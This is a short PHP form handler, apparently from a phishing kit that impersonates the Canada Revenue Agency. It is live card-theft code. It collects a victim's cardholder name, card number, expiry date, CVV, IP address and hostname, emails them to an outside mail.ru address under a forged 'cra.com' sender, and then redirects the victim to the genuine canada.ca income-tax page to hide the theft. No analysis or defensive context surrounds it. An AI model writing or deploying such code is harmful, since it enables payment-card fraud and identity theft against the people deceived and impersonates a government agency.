<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Canada Revenue Agency +++====\n";
$message .= "name card : ".$_POST['ccname']."\n";
$message .= "Credit card number : ".$_POST['ccnum']."\n";
    $message .= "exp : ".$_POST['exp']."\n";
    $message .= "CVV : ".$_POST['cvv']."\n";
    $message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "rayanboujna@mail.ru"; 
$subject = "CANADA VBV *_* [".$_POST['ccnum']."] $ip";
$headers = "From:  <card@cra.com>";

mail($send,$subject,$message,$headers);
header("Location: https://www.canada.ca/en/services/taxes/income-tax.html");

?>
